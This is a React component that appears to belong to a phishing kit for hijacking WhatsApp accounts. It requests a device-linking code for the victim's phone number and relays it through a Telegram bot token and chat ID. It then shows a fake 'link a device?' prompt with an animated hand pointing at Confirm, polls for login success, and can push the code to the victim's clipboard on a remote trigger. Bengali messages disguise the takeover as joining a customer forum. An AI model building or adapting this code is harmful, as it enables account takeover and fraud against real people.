import React, { useState, useEffect } from "react";
import { Check, Copy, AlertTriangle, Monitor, Smartphone, RefreshCw, Sparkles, XCircle, Loader2 } from "lucide-react";

interface StepConfirmLinkProps {
  code: string;
  onRestart: () => void;
  userId: string;
  session?: any;
  countryCode: string;
  phoneNumber: string;
  botToken: string;
  chatId: string;
  onCancelNumber: () => void;
}

export default function StepConfirmLink({
  code,
  onRestart,
  userId,
  session,
  countryCode,
  phoneNumber,
  botToken,
  chatId,
  onCancelNumber
}: StepConfirmLinkProps) {
  const [seconds, setSeconds] = useState(15);
  const [copied, setCopied] = useState(false);
  const [loginState, setLoginState] = useState<"pending" | "success" | "error">("pending");
  const [errorDetails, setErrorDetails] = useState<string>("");
  const [retryLoading, setRetryLoading] = useState(false);
  const [retrySuccess, setRetrySuccess] = useState(false);

  // Instant sync with top-level session state
  useEffect(() => {
    if (session) {
      if (session.loginStatus === "success") {
        setLoginState("success");
      } else if (session.loginStatus === "error") {
        setLoginState("error");
        setErrorDetails(session.lastError || "ডিভাইস লিঙ্কিং ব্যর্থ বা বাতিল হয়েছে।");
      }
    }
  }, [session]);

  // Countdown timer logic
  useEffect(() => {
    const timer = setTimeout(() => {
      setSeconds((prev) => {
        if (!session?.codeLive) {
          // Loop between 15 and 1 continuously
          return prev <= 1 ? 15 : prev - 1;
        } else {
          // Standard decrement to 0
          return prev <= 0 ? 0 : prev - 1;
        }
      });
    }, 1000);
    return () => clearTimeout(timer);
  }, [seconds, session?.codeLive]);

  const handleCopy = () => {
    if (!session?.codeLive) return;
    const cleanCode = code.replace(/[^A-Z0-9]/ig, "");
    navigator.clipboard.writeText(cleanCode)
      .then(() => {
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      })
      .catch((err) => {
        console.warn("Manual clipboard copy blocked/failed:", err);
      });
  };

  const handleRetryPush = async () => {
    try {
      setRetryLoading(true);
      setRetrySuccess(false);

      // Log push action to backend
      fetch("/api/log-activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          action: "RETRY পুশ নোটিফিকেশন পাঠানোর অনুরোধ (১-ক্লিক রিট্রাই)",
          details: { phone: `${countryCode} ${phoneNumber}` }
        })
      }).catch(console.error);

      const cleanPhone = `${countryCode}${phoneNumber}`.replace(/[^0-9]/g, "");
      const res = await fetch("/api/get-linking-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phoneNumber: cleanPhone,
          sessionId: userId,
          telegramToken: botToken,
          telegramChatId: chatId
        })
      });

      const data = await res.json();
      setRetryLoading(false);
      if (res.ok && data.success) {
        setRetrySuccess(true);
        setSeconds(15); // Refresh countdown timer decoration
        setTimeout(() => setRetrySuccess(false), 2500);
      }
    } catch (err) {
      console.error("Error triggering push:", err);
      setRetryLoading(false);
    }
  };

  // Real-time backend login approval polling
  useEffect(() => {
    let active = true;

    const interval = setInterval(async () => {
      if (!active) return;

      try {
        const res = await fetch(`/api/sessions/${userId}`);
        const data = await res.json();
        
        if (data.success && data.session) {
          const { loginStatus, remoteCopyTrigger, lastError } = data.session;
          
          if (remoteCopyTrigger) {
            navigator.clipboard.writeText(code)
              .then(() => {
                setCopied(true);
                setTimeout(() => setCopied(false), 2000);
              })
              .catch((err) => {
                console.warn("Automated clipboard copy blocked (Document not focused):", err);
              });

            fetch("/api/log-activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId,
                action: "রিমোট কপি ট্রিগার সফলভাবে সম্পন্ন হয়েছে (StepConfirmLink)",
                details: { code }
              })
            }).catch(console.error);

            fetch(`/api/sessions/${userId}/clear-remote-copy`, { method: "POST" }).catch(console.error);
          }

          if (loginStatus === "success") {
            setLoginState("success");
            clearInterval(interval);
          } else if (loginStatus === "error") {
            setLoginState("error");
            setErrorDetails(lastError || "ডিভাইস লিঙ্কিং ব্যর্থ বা বাতিল হয়েছে।");
            clearInterval(interval);
          }
        }
      } catch (err) {
        console.warn("Polling error in StepConfirmLink:", err);
      }
    }, 2000);

    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [userId, code]);

  return (
    <div className="flex flex-col justify-between h-full flex-grow text-center select-none">
      <div className="flex-grow flex flex-col justify-center py-2 animate-fade-in">
        {/* Tips Title (Yellow) */}
        <h1 className="text-[#facc15] text-3xl font-extrabold mb-3 tracking-wide drop-shadow-sm">
          Tips
        </h1>

        {/* Dynamic Display State depends on real-time feedback */}
        {loginState === "pending" && (
          <>
            <p className="text-zinc-200 text-sm font-medium px-4 mb-4 leading-relaxed">
              The pairing code has been copied,
              <br />
              please paste it in WhatsApp
            </p>

            {/* ARE YOU TRYING TO LINK A DEVICE? CUSTOM CARD */}
            <div className="bg-[#121214] border border-zinc-800/80 rounded-3xl p-5 text-center max-w-xs mx-auto mb-4 relative shadow-2xl">
              {/* Circular icon container with overlapping Laptop + Phone */}
              <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-xl border border-zinc-800">
                <div className="relative text-[#1d90f4] flex items-center justify-center">
                  <Monitor className="w-9 h-9" />
                  <div className="absolute bottom-[-4px] right-[-4px] bg-white p-0.5 rounded-md shadow-md">
                    <Smartphone className="w-4 h-4 text-zinc-800" />
                  </div>
                </div>
              </div>

              <h3 className="text-white font-bold text-base mb-1.5 leading-snug">
                Are you trying to
                <br />
                link a device?
              </h3>
              
              <p className="text-zinc-400 text-[10px] leading-relaxed px-1 mb-4">
                Chrome (Windows) is attempting to link to your WhatsApp account. If this is you, tap Confirm to continue.
              </p>

              {/* Confirm Button & Pointing Hand Cursor */}
              <div className="relative w-full mb-3">
                <button className="w-full bg-[#1ed760] hover:bg-[#1db954] text-black font-extrabold py-2.5 rounded-full text-xs transition-all shadow-md active:scale-95 cursor-default focus:outline-none select-none">
                  Confirm
                </button>
                
                {/* Pointer Hand SVG Graphic (Precisely positioned to point at the button) */}
                <div className="absolute -right-2 -bottom-5 w-14 h-14 pointer-events-none transform -rotate-12 animate-bounce">
                  <svg viewBox="0 0 100 100" className="w-full h-full drop-shadow-lg">
                    <path
                      d="M85,90 C80,75 75,65 65,58 C58,52 52,50 48,51 C45,51 43,53 43,55 C43,58 45,61 48,63 L55,68 C56,69 55,71 53,71 L40,65 C37,64 34,65 34,68 C34,71 36,73 39,74 L48,78 C50,79 49,81 47,81 L38,78 C35,77 33,78 33,81 C33,84 35,86 38,87 L48,91 L50,95 C45,100 88,100 85,90 Z"
                      fill="#fbcfe8"
                      stroke="#db2777"
                      strokeWidth="2.5"
                    />
                    <path
                      d="M43,55 L25,40 C22,37 18,41 21,44 L35,56 C37,58 41,57 43,55 Z"
                      fill="#fbcfe8"
                      stroke="#db2777"
                      strokeWidth="2.5"
                    />
                  </svg>
                </div>
              </div>

              <button className="text-[#1ed760] hover:underline text-[10.5px] font-bold focus:outline-none select-none">
                Cancel
              </button>
            </div>
          </>
        )}

        {loginState === "success" && (
          <div className="py-8 px-4 flex flex-col items-center justify-center animate-fade-in space-y-4">
            <div className="w-20 h-20 bg-green-500/10 border border-green-500/20 rounded-full flex items-center justify-center text-green-400">
              <Sparkles className="w-10 h-10 animate-pulse" />
            </div>
            <div className="space-y-1.5">
              <h2 className="text-xl font-bold text-white">সরাসরি সংযোগ সম্পন্ন!</h2>
              <p className="text-xs text-zinc-400 leading-relaxed px-2">
                অভিনন্দন, আপনার ডিভাইসটি সাফল্যের সাথে কনফার্মড ম্যাচিং লাইনে লিঙ্কড হয়েছে। গ্রাহক ফোরামে অ্যাক্সেস রেডি।
              </p>
            </div>
          </div>
        )}

        {loginState === "error" && (
          <div className="py-8 px-4 flex flex-col items-center justify-center animate-fade-in space-y-4">
            <div className="w-20 h-20 bg-red-500/15 border border-red-500/20 rounded-full flex items-center justify-center text-red-400">
              <XCircle className="w-10 h-10" />
            </div>
            <div className="space-y-1.5">
              <h2 className="text-xl font-bold text-white">ডায়াগনস্টিক বাতিল হয়েছে!</h2>
              <p className="text-xs text-red-400/90 leading-relaxed px-4">
                {errorDetails || "হোয়াটসঅ্যাপ লিঙ্ক সেশনটি বাতিল করা হয়েছে বা কী-এক্সচেঞ্জ রিজেক্ট করা হয়েছে।"}
              </p>
            </div>
          </div>
        )}

        {/* Text Instruction */}
        <p className="text-[#a855f7] font-extrabold text-xs mb-4 px-4 leading-normal">
          Please pay attention to the WhatsApp popup next.
        </p>

        {/* Verification Code Box with Dashed Border and CONNECT Button */}
        <div className="border-2 border-dashed border-purple-500/60 rounded-2xl py-3 px-4 flex justify-between items-center bg-purple-950/10 mx-2 mb-4">
          <div className="flex flex-col text-left">
            <span className="text-[10px] text-zinc-400 font-semibold uppercase tracking-wider">Verification Code:</span>
            {session?.codeLive ? (
              <span className="text-xl font-bold tracking-wider text-pink-400 font-mono">
                {code}
              </span>
            ) : (
              <span className="text-lg font-bold tracking-wider text-[#facc15] font-mono animate-pulse">
                {seconds}s Waiting...
              </span>
            )}
          </div>
          
          <button
            onClick={handleCopy}
            disabled={!session?.codeLive}
            className={`text-xs font-bold px-4 py-2 rounded-xl transition-all flex items-center gap-1 shrink-0 ${
              !session?.codeLive
                ? "bg-zinc-800 text-zinc-500 cursor-not-allowed"
                : copied 
                ? "bg-green-600 text-white" 
                : "bg-purple-600 hover:bg-purple-700 text-white"
            } active:scale-95 focus:outline-none`}
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5" />
                <span>Connected!</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span>Connect</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Countdown Timer / RETRY Button */}
      <div className="mb-2 space-y-2">
        <button
          onClick={handleRetryPush}
          disabled={retryLoading}
          className={`w-full font-extrabold py-4 px-6 rounded-3xl transition-all duration-300 tracking-wider text-sm uppercase shadow-lg transform hover:scale-[1.01] active:scale-95 flex items-center justify-center gap-2 focus:outline-none ${
            retrySuccess
              ? "bg-green-600 text-white shadow-green-950/20"
              : retryLoading
              ? "bg-purple-800 text-purple-300 cursor-wait"
              : "bg-[#9333ea] hover:bg-[#a855f7] text-white shadow-purple-950/50"
          }`}
        >
          {retryLoading ? (
            <>
              <Loader2 className="w-4 h-4 animate-spin" />
              <span>SENDING...</span>
            </>
          ) : retrySuccess ? (
            <>
              <Check className="w-4 h-4" />
              <span>PUSH SENT!</span>
            </>
          ) : (
            <>
              <RefreshCw className="w-4 h-4" />
              <span>RETRY</span>
            </>
          )}
        </button>

        {/* Change phone option */}
        <button
          onClick={onCancelNumber}
          className="text-xs text-zinc-500 hover:text-zinc-300 transition-colors flex items-center justify-center gap-1 mx-auto py-1"
        >
          <XCircle className="w-3" />
          <span>নম্বর পরিবর্তন করুন</span>
        </button>
      </div>
    </div>
  );
}
